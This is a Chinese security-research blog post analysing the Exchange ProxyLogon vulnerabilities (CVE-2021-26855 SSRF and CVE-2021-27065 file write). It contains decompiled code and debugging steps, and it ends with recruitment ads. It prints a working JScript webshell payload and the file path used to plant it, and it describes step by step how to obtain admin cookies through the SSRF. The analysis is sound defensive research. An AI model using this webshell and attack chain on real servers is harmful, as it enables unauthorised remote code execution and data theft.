> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/vz3CVwvUVMG92XFl4c4q3Q)

**STATEMENT**

**声明**

由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，雷神众测及文章作者不为此承担任何责任。

雷神众测拥有对此文章的修改和解释权。如欲转载或传播此文章，必须保证此文章的完整性，包括版权声明等全部内容。未经雷神众测允许，不得任意修改或者增减此文章内容，不得以任何方式将其用于商业目的。

**No.1 简介**

近期，微软 Exchange 邮件服务器的⾼危安全漏洞引起了安全圈的普遍关注，主要包括的漏洞类型和 CVE 编号如下所示：

· CVE-2021–26855 SSRF 

· CVE-2021–26857 反序列化 

· CVE-2021–26858 任意⽂件写⼊ 

· CVE-2021–27065 任意⽂件写⼊

其中 CVE-2021–26855 是⼀个 SSRF，攻击者可以不经过任何类型的身份验证来利⽤此漏洞，只需要能够访问 Exchange 服务器即可；与此同时，CVE-2021–27065 是⼀个任意⽂件写⼊漏洞，它需要登陆的管理员账号权限才能触发。因此，两者的结合可以造成未授权的 webshell 写⼊，属于⾮常⾼危的安全漏洞。

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVj5U5WuSlmmyiclXwTVYUchR4nhicC9OJdA07goyz8ricVv2ySIPGOrgKOZWq7YqmjfkX6bfX1LCxDQ/640?wx_fmt=png)

在本⽂中，我们⾸先介绍了 Exchange 处理请求的流程和对其调试⽅法；接下来具体分析了 CVE-2021–26855 与 CVE-2021–27065 漏洞原理，最后较为详细的描述了漏洞相关的 ProxyLogon 接⼝部分的详细验证过程。四个安全漏洞的利⽤过程示意图如上所示 [10]。

**No.2 Exchange 处理请求流程**

Exchange 系统的服务架构如下图所示，由前端和多个后端组件组成。⽤户基于各类协议对 Exchange 的前端发起请求，前端解析请求后会将其转发到后端相对应的服务当中。以基于 HTTP/HTTPS 协议的访问为例，来⾃ Outlook 或 Web 客户端的请求会⾸先经过 IIS，然后进⼊到 Exchange 的 HTTP 代理，代理根据请求类型将 HTTP 请求转发到不同的后端组件中。整个处理流程如下图所示 [11]：

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVj5U5WuSlmmyiclXwTVYUchR67FezKpuhmTQfqH4xiaeicGvPawjH6Gx2UmXR50fS1LH5SvGT8jjKqw/640?wx_fmt=png)

**No.3 调试⽅法**

相关分析⽂章⼀般只分析了漏洞的原理，却忽略了介绍如何调试代码的⽅法，由于对. NET 框架的调试相对来说⽐较复杂，所以⾸先介绍⼀下我们的调试⽅法。

**调试⼯具 --dnspy**

dnspy 是⼀个. NET 反汇编和调试编辑器 [1]。它可以对基于. NET 框架编写的动态链接库（.dll）进⾏反编译，让我们清楚地查看代码逻辑和结构。同时可以让我们在没有源代码的情况，对程序进⾏下断点调试。

**静态分析**

通过 dnspy 可以直接对 dll 库进⾏逆向，直接打开被调试⽂件即可，⼗分⽅便。 对于 Exchange 的漏洞， 我们⽤到的最关键的 dll 库为 Miscrosoft.Exchange.FrontEndProxy.dll ，这个库中包含了 Exchange 将前端请求转发到后端的过程。

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVj5U5WuSlmmyiclXwTVYUch0zej0rPdj7xIick4BbglChqiciaHibWsmWwqDlyVg6iceyLSW2Tvb1qquXw/640?wx_fmt=png)

不过由于整个 Http 请求还经过了⼀些不包含在 Exchange 内的运⾏库（如. Net ⾃带的 System.Web 库）， 仅凭静态分析⽆法跟⼊这些库中，因此还需要动态调试。

**动态调试**

通过 dnspy 的附加到进程功能，我们可以动态调试. NET 程序。然⽽由于 Exchange 程序逻辑极其复杂，相关进程较多，如何从复杂的进程中找到被调试的进程是⼀个难点。

⾸先通过 IIS 管理器可以查看当前服务器的应⽤程序池，其中 Exchange 的应⽤程序池以 MSExchange 为开头。

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVj5U5WuSlmmyiclXwTVYUchWpXm4YhaaRWAIbNSBR8rd9iaP2bUvsGpCvXuMap02dHF1IaAxhaOjUw/640?wx_fmt=png)

随后查看 IIS 服务相关的所有进程。进⼊ C:\Windows\System32\inetsrv，执⾏ appcmd list wp ，可以查看进程名和进程号。

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVj5U5WuSlmmyiclXwTVYUchIYSjrtrtX2Ldbcu3Jibu2qrINWVshibHbvSjtnovRSibz25MrLSkkoJBg/640?wx_fmt=png)

经过测试，applicationPool.MSExchangeECPAppPool 是本次漏洞的相关进程。于是可以在 dnspy 中，点击调试 -> 附加到进程 -> 选中进程 -> 附加。之后就可以下断点进⾏调试了。

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVj5U5WuSlmmyiclXwTVYUchMSkuRLWKiahART3PuKZGuicJDASSn1IOibLDt7NbC4kS9c5efMX5WhaTw/640?wx_fmt=png)

**No.4 CVE-2021–26855**

CVE-2021-26855 是⼀个 SSRF 漏洞。恶意⽤户可以在远程绕过安全验证向任意端⼝发送数据。 研究⼈员对补丁前后的 dll 库进⾏ diff，发现在 Microsoft.Exchange.FrontEndHttpProxy 的 BEResourceRequestHandler 类中，新增了 ShouldBackendRequestAnonymous ⽅法 [2]。因此我们可以从这个类⼊⼿。

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVj5U5WuSlmmyiclXwTVYUch1yOrlwNrTOicmKpmGI3Q7UKnejC5RfEaQDZWIiayFGm3f3BQ1ic1vgN6A/640?wx_fmt=png)

BEResourceRequestHandler 是⼀个⽤于处理向后端进⾏资源型请求的类，如请求 js，png，css ⽂件等。它在函数 SelectHandlerForUnauthenticatedRequest 中被引⽤，⽽要创建这个类的实例，⾸先需要函数 BEResourceRequestHandler.CanHandle() 返回 True。

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVj5U5WuSlmmyiclXwTVYUchZknN23IOSKUuoJPFxZfIsJj3ia2O2ia7H6wH34dfWakenic52nI8On3tQ/640?wx_fmt=png)

分析 CanHandle 函数，可以发现返回 True 需要以下两个条件： 

· HTTP 请求的 Cookie 中含有 X-BEResource 键； 

· 请求应是资源型请求，即请求的⽂件后缀应为规定的⽂件类型。

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVj5U5WuSlmmyiclXwTVYUch9DkkA7HhF8JqnrH2QwXl7JjTts6ur1Zwy8uSnNA0I9tR7sv1o3fPpw/640?wx_fmt=png)

```
privatestaticstringGetBEResouceCookie(HttpRequesthttpRequest)
{
  stringresult=null;
  HttpCookiehttpCookie=httpRequest.Cookies[Constants.BEResource];
  if (httpCookie!=null)
  {
    result = httpCookie.Value;
  }
  return result; 
}
```

```
public static bool IsResourceRequest(string localPath) {
 ArgumentValidator.ThrowIfNull("localPath", localPath);
 return localPath.EndsWith(".axd", StringComparison.OrdinalIgnoreCase) ||
localPath.EndsWith(".crx", StringComparison.OrdinalIgnoreCase) ||
localPath.EndsWith(".css", StringComparison.OrdinalIgnoreCase) ||
localPath.EndsWith(".eot", StringComparison.OrdinalIgnoreCase) ||
localPath.EndsWith(".gif", StringComparison.OrdinalIgnoreCase) ||
localPath.EndsWith(".jpg", StringComparison.OrdinalIgnoreCase) ||
localPath.EndsWith(".js", StringComparison.OrdinalIgnoreCase) ||
localPath.EndsWith(".htm", StringComparison.OrdinalIgnoreCase) ||
localPath.EndsWith(".html", StringComparison.OrdinalIgnoreCase) ||
localPath.EndsWith(".ico", StringComparison.OrdinalIgnoreCase) ||
localPath.EndsWith(".manifest", StringComparison.OrdinalIgnoreCase) ||
localPath.EndsWith(".mp3", StringComparison.OrdinalIgnoreCase) ||
localPath.EndsWith(".msi", StringComparison.OrdinalIgnoreCase) ||
localPath.EndsWith(".png", StringComparison.OrdinalIgnoreCase) ||
localPath.EndsWith(".svg", StringComparison.OrdinalIgnoreCase) ||
localPath.EndsWith(".ttf", StringComparison.OrdinalIgnoreCase) ||
localPath.EndsWith(".wav", StringComparison.OrdinalIgnoreCase) ||
localPath.EndsWith(".woff", StringComparison.OrdinalIgnoreCase) ||
localPath.EndsWith(".bin", StringComparison.OrdinalIgnoreCase) ||
localPath.EndsWith(".dat", StringComparison.OrdinalIgnoreCase) ||
localPath.EndsWith(".exe", StringComparison.OrdinalIgnoreCase) ||
localPath.EndsWith(".flt", StringComparison.OrdinalIgnoreCase) ||
localPath.EndsWith(".mui", StringComparison.OrdinalIgnoreCase) ||
localPath.EndsWith(".xap", StringComparison.OrdinalIgnoreCase) ||
localPath.EndsWith(".skin", StringComparison.OrdinalIgnoreCase);
}
```

SelectHandlerForUnauthenticatedRequest 函数在 OnPostAuthorizeInternal 中被调⽤。 httpHandler 会被设置为 BEResourceRequestHandler 的⼀个实例，由于 BEResourceRequestHandler 继承于 ProxyRequstHandler，因此会进⼊ ((ProxyRequestHandler)httpHandler).Run(context)，并最终在 HttpContext.RemapHandler 中把该 httpHandler 设置给 this._remapHandler，即是 context.Handler。

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVj5U5WuSlmmyiclXwTVYUchRSfX6OalBpbu1oQduCMCleh5ubcRof1PT57ib33DLpSwd91l9UNKW9g/640?wx_fmt=png)

接下来，进⼊ System.Web.HttpApplication 中 CallHandlerExecutionStep 接⼝的 HttpApplication.IExecutionStep.Execute() 函数。⾸先，从 context.Handler 获取 handler ，即我们之前提到的 BEResourceRequestHandler，由于 BEResourceRequestHandler 继承与 ProxyRequestHandler 类，⽽该类⼜继承了 IHttpAsyncHandler 类，因此会进⼊到如下图所示的 if 分⽀当中，并在图中的 3872 ⾏调⽤ ProxyRequestHandler.BeginProcessRequest() 函数。

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVj5U5WuSlmmyiclXwTVYUchBV255bw1GicRydic3moUOS4Qm2JiayPOSibuYaHsTCXvaibFnucIIjlPvRg/640?wx_fmt=png)

接下来，在 ProxyRequestHandler.BeginProcessRequest 中会调⽤ ProxyRequestHandler.BeginCalculateTargetBackEnd, 在 ProxyRequestHandler.BeginCalculateTargetBackEnd 中调⽤ ProxyRequestHandler.InternalBeginCalculateTargetBackEnd，最终进⼊到 BEResourceRequestHandler.ResolveAnchorMailbox。BEResourceRequestHandler.ResolveAnchorMailbox 函数会调⽤ BEResourceRequestHandler.GetBEResouceCookie 获取键 X-BEResource 的值，然后将其传⼊ BackEndServer.FromString 中。

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVj5U5WuSlmmyiclXwTVYUchCkAPlpzRarzqXlbKmfFfgtWBcm1UETAmQJmnAqolrpUvsYic9pghzzA/640?wx_fmt=png)

在 BackEndServer.FromString 函数中，⾸先根据～将 X-BEResource 的值分割为两部分，前⼀部分作为 fqdn，后⼀部分则是 version 的值。

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVj5U5WuSlmmyiclXwTVYUchk9FE4Z0CbdN8ib25sQleIXrKkvVUSJOXnIBt3gpJgcLn4Yve466zYrQ/640?wx_fmt=png)

函数继续执⾏，经过⼀系列函数调⽤：后端服务器的⽬标 FQDN 计算完后调⽤ OnCalculateTargetBackEndCompleted 函数，该函数⼜调⽤ InternalOnCalculateTargetBackEndCompleted 函数，紧接着调⽤ BeginValidateBackendServerCacheOrProxyOrRecalculate 函数，然后调⽤ BeginProxyRequestOrRecalculate 函数，最终进⼊到 BeginProxyRequest 函数中。其中调⽤ GetTargetBackendServerUrl 函数获取向 backend 转发请求的 URL。

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVj5U5WuSlmmyiclXwTVYUchaiaUpR6EIyZRCeS3kVNXibu3gPYQ8ZrmfRIdPb8axza5lfSVIx5gBN9A/640?wx_fmt=png)

GetTargetBackendServerUrl 中将调⽤ GetClientUrlForProxy 函数构造发起请求的 URL。

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVj5U5WuSlmmyiclXwTVYUchW0vwYB39JvgJMgu0P8gcDtyIiaHXfSBl3hkxcRuLkxicl0q65vW9N9FA/640?wx_fmt=png)

最终调⽤ ProxyRequestHandler.CreateServerRequest(uri) 向 backend 发起请求。

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVj5U5WuSlmmyiclXwTVYUchicNFBTrJTcBbPV0yVsnKrWPhjI4INaTpUVle70UZLTS5KC1mibkANNsA/640?wx_fmt=png)

以上即是 SSRF 漏洞的整个流程。

**No.5 CVE-2021–27065**

CVE-2021–27065 是⼀个任意⽂件写⼊漏洞，相⽐于 CVE-2021–26855 简单得多。 ⾸先需要⼀个管理员账号，进⼊ Servers->Virtual Directories->OAB

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVj5U5WuSlmmyiclXwTVYUch8wb0NY1voABjEqUkcJLoIictIibF23mrVJQAIqiavVzdf2TwlFGptSrQQ/640?wx_fmt=png)

编辑 OAB 配置，在外部链接中写⼊ shell 并保存。

```
http://aaa/<script language="JScript" runat="server">function Page_Load()
{eval(Request["orange"],"unsafe");}</script>
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVj5U5WuSlmmyiclXwTVYUch8jrQZ7rFhb0z3enjfKarx9ljSGIwVniaswnJ8Q8mDhdAokmxfsf8TLw/640?wx_fmt=png)

接下来输⼊⽂件路径并重置。

```
\\127.0.0.1\c$\inetpub\wwwroot\aspnet_client\1chig0.aspx
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVj5U5WuSlmmyiclXwTVYUchs7UjvQgdIh8C6dHH8rx4W3NHwRJRFQSSCukIgklsY4FscsASw2Ie3Q/640?wx_fmt=png)

shell 即可成功写⼊。

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVj5U5WuSlmmyiclXwTVYUchHtouTWGk6l1yUTwKhJ71SwwFmRVQJdQo0hXXyHnMSEFoIWiapebCkyw/640?wx_fmt=png)

**No.6 两者配合写⼊ shell**

由于漏洞内容较为敏感，⼤部分⽂章到这⾥的分析很少。我们通过对协议分析以及⾃⼰的理解，还原了 proxylogon 的技术细节。

**获取 LegacyDN**

Autodiscover 是 Exchange 中的⼀个服务，该服务可以帮助客户端（例如 Outlook）以最少的⽤户输⼊来进⾏电⼦邮箱的配置。因为在前⽂提到的 SSRF 中需要获知后端服务器即 Exchange 服务器的 FQDN，因此可以利⽤该服务。 

Autodiscover 的请求格式可以在官⽅⽂档 [6] 中找到。

```
<Autodiscover
xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema
/2006">
  <Request>
 <EMailAddress>Administrator@exploittest.xyz</EMailAddress>
 
<AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/ou
tlook/responseschema/2006a</AcceptableResponseSchema>
  </Request>
</Autodiscover>
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVj5U5WuSlmmyiclXwTVYUchIykhkpNllUiasUZpJvK5Y8qDV91G6Fu8AW6wsc7zT7zXDaUcLRdH8RA/640?wx_fmt=png)

**获取 SID**

消息处理 API（MAPI）是 Outlook ⽤于接收和发送电⼦邮件相关信息的 API，在 Exchange 2016 以及 2019 当中，微软⼜为其加⼊了 MAPI over HTTP 机制，使得 Exchange 和 Outlook 可以在标准的 HTTP 协议模型之下利⽤ MAPI 进⾏通信。整个 MAPI over HTTP 的协议标准可以在官⽅⽂档中查询。为了获取对应邮箱的 SID，如下图所示的 exploit 中利⽤了⽤于发起⼀个新会话的 Connect 类型请求。

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVj5U5WuSlmmyiclXwTVYUchibjBTqox1Bw0MnZo7KNwa7eFraxUCJkgOkMRdMjSQFagQW2TsReF6PQ/640?wx_fmt=png)

⼀个正常的 Connect 类型请求如图所示 [5]，包含 UserDn 等多个字段，其中 UserDn 指的是⽤户在该域中的专有名称（Distinguish Name），该字段已被我们通过上⼀步骤的请求中得到。该 Connect 类型请求通过解析后会将相关参数交给 Exchange RPC 服务器中的 EcDoConnectEx ⽅法执⾏。由于发起请求的 RPC 客户端的权限为 SYSTEM，对应的 SID 为 S-1-5-18，与请求中给出的 DN 所对应的 SID 不匹配，于是响应中返回错误信息，该信息中包含了 DN 所对应的 SID，从⽽达到了⽬的。

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVj5U5WuSlmmyiclXwTVYUchQeg84YZyoricRYlXzeA5nQRr4oQJo5GOuRpjmu33OLs709pYHnicP4PQ/640?wx_fmt=png)

各个字段的具体含义如下图所示 [5]。

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVj5U5WuSlmmyiclXwTVYUch2z7n6aognRy8VVvNpedtHzVcCOE9Ll1apuSzic0b3gAyrpVX8eCVVibg/640?wx_fmt=png)

**获取管理员登陆凭证**

通过 Burpsuite 拦截数据包可以看到，exploit 利⽤ SSRF 漏洞访问了 Exchange 后端的 /ecp/proxyLogon.ecp 路径，从响应中得到了 ASP.NET_SessionId 以及 msExchEcpCanary 两个 Cookie，根据 Cookie 的键名我们可以得知这两个 Cookie 分别对应会话 ID 以及⽤户的登录凭证。

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVj5U5WuSlmmyiclXwTVYUch6zia6HDbz9W0GuccoCAMxtYcHCYqvy3VOlfohoehS09wSmqbf3vECDA/640?wx_fmt=png)

为了了解它们是如何⽣成的，我们查看 IIS 管理器，可以找到 ecp 的后端. NET 应⽤程序物理路径。

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVj5U5WuSlmmyiclXwTVYUch2EavtwE1X2AnBcdMXDx54DIOMEAsOLiaRqw88aiciaQYgiaDiaH0ckallkw/640?wx_fmt=png)

在该物理路径下的. NET 应⽤配置⽂件 web.config 中定义了不同路径的 HTTP 请求对应的处理函数，检索可知路径 proxyLogon.ecp 是由 ProxyLogonHandler 来处理的，然⽽对相应的 dll 进⾏反编译后发现该 Handler 仅修改了 HTTP 响应的状态码。

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVj5U5WuSlmmyiclXwTVYUchyPjGhM9RiaDS1BM1vfOcibjh9L4PueDPWkfJI8MeTjjEa61C2XSuu34g/640?wx_fmt=png)

最终通过调试后发现，真正与 msExchEcpCanary 以及 ASP.NET_SessionId 相关的代码是在类 RbacModule 中的，通过 web.config 可以看到 RbacModule 作为应⽤的其中⼀个模块⽤于处理 HTTP 请求。

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVj5U5WuSlmmyiclXwTVYUchJpRYSIYGciaTbD90YL9MadBfXUZnibNlsqibL0eiaYrPBW8Mt9nfmwtc7g/640?wx_fmt=png)

在该模块中由函数 Application_PostAuthenticateRequest 具体实现对 HTTP 请求的解析。相关关键代码如下，⾸先函数根据 httpContext ⽣成 AuthenticationSettings 实例。

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVj5U5WuSlmmyiclXwTVYUcho4QkoG9EtoSIDHSKlwJGtLYFCL7KDrGuX6yS3TkrqhfiaJnY59DHWiaQ/640?wx_fmt=png)

在 AuthenticationSettings 的构造函数中，由于所有的 if 语句均不满⾜，函数会根据 context ⽣成 ⼀个 RbacSettings 实例，并赋值给⾃⼰的 Session 属性。

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVj5U5WuSlmmyiclXwTVYUch1LjOeiboicBgRbFwkdtBbdU41egPNonacPBQyBkaR9MZCvzxIerWia9uQ/640?wx_fmt=png)

⽽在 RbacSettings 的构造函数中，函数会判断请求路径是否以 /proxyLogon.ecp 结尾，若是则进⼊下⽅的 if 分⽀，利⽤请求数据创建 SerializedAccessToken 实例。

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVj5U5WuSlmmyiclXwTVYUchjcVibPewtM8A1zlA5R8LEhuwAeLPsKdZOdRs24ibBPP6uskI7sLiaCZpw/640?wx_fmt=png)

分析 SerializedAccessToken 类，可知该类会将访问令牌序列化成 XML 格式，其中根节点的名字为 r，根节点的 at 属性对应访问令牌中的认证类型、ln 属性对应访问令牌中的登录名称；根节点的⼦ 节点为 SID 节点，节点名字为 s，当中的属性 t 对应 SID 类型，属性 a 对应 SID 属性，节点中的⽂本为 SID。其序列化函数定义如下，可以看到令牌⼤致与 Windows 中的安全访问令牌内容相似。

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVj5U5WuSlmmyiclXwTVYUchn9Wo3gB4GkFiaiaRAxXibqxS8Iv6SH3UvbDSkRJG9bqqnCLMEkvHGNtlw/640?wx_fmt=png)

随后构造函数根据请求头部的 msExchLogonMailbox 字段以及 logonUserIdentity 变量调 ⽤ GetInboundProxyCaller 函数获取该代理请求的发起服务器。若返回结果不为空则调 ⽤ EcpLogonInformation.Create 函数创建⼀个 EcpLogonInformation 实例，再⽤该实例创建⼀ 个 EcpIdentity 实例。

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVj5U5WuSlmmyiclXwTVYUch7dicc5epCkI9QxZOuhc7ED3w9FzyvicQYl0CY0N6R3IfxZm0lcTLoHqw/640?wx_fmt=png)

Create 函数⾸先根据 logonMailboxSddlSid ⽣成安全标识符实例，然后根据 proxySecurityAccessToken 参数⽣成 SerialzedIdentity 实例，并最后⽣成 EcpLogonInformation 实例。⽽根据名称可知 logonUserIdentity 定义了登⼊⽤户的权限，因⽽我们能够得到任意 SID 对应⽤户的权限。

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVj5U5WuSlmmyiclXwTVYUchBkkYgZbVbeYX3KcCONxPODdn0eMcvic0AcXdyy5uMEPze58LQkaqbiaw/640?wx_fmt=png)

之后程序回到 RbacSettings 的构造函数中，在响应中添加 ASP.NET_SessionId Cookie。

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVj5U5WuSlmmyiclXwTVYUchEdZ5HBmu2jNFY2ELUKmGFexibzKJS7UV6wbj6Gfg4NfoibiagQibn4Czjw/640?wx_fmt=png)

程序接下来返回到 RbacModule 的函数中，在 AuthenticationSettings 实例⽣成后其 Session 属性 被赋值给 httpContext.User，并进⼊ if 分⽀调⽤ CheckCanary 函数。

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVj5U5WuSlmmyiclXwTVYUcho4QkoG9EtoSIDHSKlwJGtLYFCL7KDrGuX6yS3TkrqhfiaJnY59DHWiaQ/640?wx_fmt=png)

CheckCanary 函数⼜将调⽤如下所示的 SendCanary 函数，该函数⾸先从请求的 Cookie 中读取 Canary 并尝试恢复，若成功则函数直接返回，否则⽣成⼀个新的 Canary 并将其加⼊到响应的 Cookie 中。从⽽我们能够构造满⾜要求的请求通过 SSRF 访问 ecp/proxyLogon.ecp 获得管理员的凭证。

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVj5U5WuSlmmyiclXwTVYUchRibqAAT0B4jiawf7X1X6aXnZODwEcSXNPibe2b14kUEtrpGhvJg5KRdMg/640?wx_fmt=png)

**写 shell**

最后根据 CVE-2021–27065 发送的请求包构造请求，即可成功写⼊ shell，不再赘述。 

· 查看 OAB 配置

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVj5U5WuSlmmyiclXwTVYUchfh5fhXE8ZliaiaoDQ6KouZZU9MBqkGbR08MKUrHMTbWooAtZTzW03cMg/640?wx_fmt=png)

· 保存外部链接

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVj5U5WuSlmmyiclXwTVYUchoaBndlSf1d19LkHX56f3Lba8lHWNKxU0mKbfpHPN1iaic55XXRkY1VJA/640?wx_fmt=png)

· 重置

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVj5U5WuSlmmyiclXwTVYUchOrJhSibWDWSCMqgNuO8Pa8Zic9w9PHRRETKtrwn1NotLTRFUxVL5UVJA/640?wx_fmt=png)

· 最终成功写⼊结果

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVj5U5WuSlmmyiclXwTVYUchzCgibGnIKjjebq0K6D4zSzIJxVTMDQEPfdE49mJ0az8Lop1XN5guxRg/640?wx_fmt=png)

**No.7 总结**

Exchange 的架构设计中不允许⽤户直接访问后端，⽽是要通过前端服务作为代理来进⾏访问。然⽽，前端在处理代理请求的过程中由于对特定 Cookie 的内容没有进⾏充分检查，导致攻击者最终能够实现服务端请求伪造。在能够对后端服务发起请求后，攻击者⼜利⽤了后端管理服务没有对⽂件类型进⾏检查的漏洞，构造恶意输⼊以及恶意⽂件后缀名实现了 WebShell 的写⼊。

**No.8 参考⽂献**

【1】https://github.com/dnSpy/dnSpy

【2】https://testbnull.medium.com/ph%C3%A2n-t%C3%ADch-l%E1%BB%97-h%E1%BB%95ng-proxylogon-mail-exchange-rce-s%E1%BB%B1-k%E1%BA%BFth%E1%BB%A3p-ho%C3%A0n-h%E1%BA%A3o-cve-2021-26855-37f4b6e06265

【3】https://www.praetorian.com/blog/reproducing-proxylogon-exploit/

【4】https://www.volexity.com/blog/2021/03/02/active-exploitation-of-microsoft-exchange-zero-day-vulnerabilities/

【5】https://interoperability.blob.core.windows.net/files/MS-OXCMAPIHTTP/%5bMS-OXCMAPIHTTP%5d.pdf

【6】https://interoperability.blob.core.windows.net/files/MS-OXDSCLI/%5bMS-OXDSCLI%5d.pdf

【7】https://www.microsoft.com/security/blog/2021/03/02/hafnium-targeting-exchange-servers/

【8】https://msrc-blog.microsoft.com/2021/03/02/multiple-security-updates-released-for-exchange-server/

【9】 https://msrc-blog.microsoft.com/2021/03/05/microsoft-exchange-server-vulnerabilities-mitigations-march-2021/ 

【10】https://www.microsoft.com/security/blog/2021/03/25/analyzing-attacks-taking-advantage-of-the-exchange-server-vulnerabilities/

【11】https://docs.microsoft.com/en-us/exchange/architecture/architecture?view=exchserver-2016

**RECRUITMENT**

**招聘启事**

**安恒雷神众测 SRC 运营（实习生）**  
————————  
【职责描述】  
1.  负责 SRC 的微博、微信公众号等线上新媒体的运营工作，保持用户活跃度，提高站点访问量；  
2.  负责白帽子提交漏洞的漏洞审核、Rank 评级、漏洞修复处理等相关沟通工作，促进审核人员与白帽子之间友好协作沟通；  
3.  参与策划、组织和落实针对白帽子的线下活动，如沙龙、发布会、技术交流论坛等；  
4.  积极参与雷神众测的品牌推广工作，协助技术人员输出优质的技术文章；  
5.  积极参与公司媒体、行业内相关媒体及其他市场资源的工作沟通工作。  
【任职要求】   
 1.  责任心强，性格活泼，具备良好的人际交往能力；  
 2.  对网络安全感兴趣，对行业有基本了解；  
 3.  良好的文案写作能力和活动组织协调能力。

简历投递至 

bountyteam@dbappsecurity.com.cn

**设计师（实习生）**  

————————

【职位描述】  
负责设计公司日常宣传图片、软文等与设计相关工作，负责产品品牌设计。  
【职位要求】  
1、从事平面设计相关工作 1 年以上，熟悉印刷工艺；具有敏锐的观察力及审美能力，及优异的创意设计能力；有 VI 设计、广告设计、画册设计等专长；  
2、有良好的美术功底，审美能力和创意，色彩感强；

3、精通 photoshop/illustrator/coreldrew / 等设计制作软件；  
4、有品牌传播、产品设计或新媒体视觉工作经历；  
【关于岗位的其他信息】  
企业名称：杭州安恒信息技术股份有限公司  
办公地点：杭州市滨江区安恒大厦 19 楼  
学历要求：本科及以上  
工作年限：1 年及以上，条件优秀者可放宽

简历投递至 

bountyteam@dbappsecurity.com.cn

安全招聘  

————————  
公司：安恒信息  
岗位：**Web 安全 安全研究员**  
部门：战略支援部  
薪资：13-30K  
工作年限：1 年 +  
工作地点：杭州（总部）、广州、成都、上海、北京

工作环境：一座大厦，健身场所，医师，帅哥，美女，高级食堂…  
【岗位职责】  
1. 定期面向部门、全公司技术分享;  
2. 前沿攻防技术研究、跟踪国内外安全领域的安全动态、漏洞披露并落地沉淀；  
3. 负责完成部门渗透测试、红蓝对抗业务;  
4. 负责自动化平台建设  
5. 负责针对常见 WAF 产品规则进行测试并落地 bypass 方案  
【岗位要求】  
1. 至少 1 年安全领域工作经验；  
2. 熟悉 HTTP 协议相关技术  
3. 拥有大型产品、CMS、厂商漏洞挖掘案例；  
4. 熟练掌握 php、java、asp.net 代码审计基础（一种或多种）  
5. 精通 Web Fuzz 模糊测试漏洞挖掘技术  
6. 精通 OWASP TOP 10 安全漏洞原理并熟悉漏洞利用方法  
7. 有过独立分析漏洞的经验，熟悉各种 Web 调试技巧  
8. 熟悉常见编程语言中的至少一种（Asp.net、Python、php、java）  
【加分项】  
1. 具备良好的英语文档阅读能力；  
2. 曾参加过技术沙龙担任嘉宾进行技术分享；  
3. 具有 CISSP、CISA、CSSLP、ISO27001、ITIL、PMP、COBIT、Security+、CISP、OSCP 等安全相关资质者；  
4. 具有大型 SRC 漏洞提交经验、获得年度表彰、大型 CTF 夺得名次者；  
5. 开发过安全相关的开源项目；  
6. 具备良好的人际沟通、协调能力、分析和解决问题的能力者优先；  
7. 个人技术博客；  
8. 在优质社区投稿过文章；

岗位：**安全红队武器自动化工程师**  
薪资：13-30K  
工作年限：2 年 +  
工作地点：杭州（总部）  
【岗位职责】  
1. 负责红蓝对抗中的武器化落地与研究；  
2. 平台化建设；  
3. 安全研究落地。  
【岗位要求】  
1. 熟练使用 Python、java、c/c++ 等至少一门语言作为主要开发语言；  
2. 熟练使用 Django、flask 等常用 web 开发框架、以及熟练使用 mysql、mongoDB、redis 等数据存储方案；  
3: 熟悉域安全以及内网横向渗透、常见 web 等漏洞原理；  
4. 对安全技术有浓厚的兴趣及热情，有主观研究和学习的动力；  
5. 具备正向价值观、良好的团队协作能力和较强的问题解决能力，善于沟通、乐于分享。  
【加分项】  
1. 有高并发 tcp 服务、分布式等相关经验者优先；  
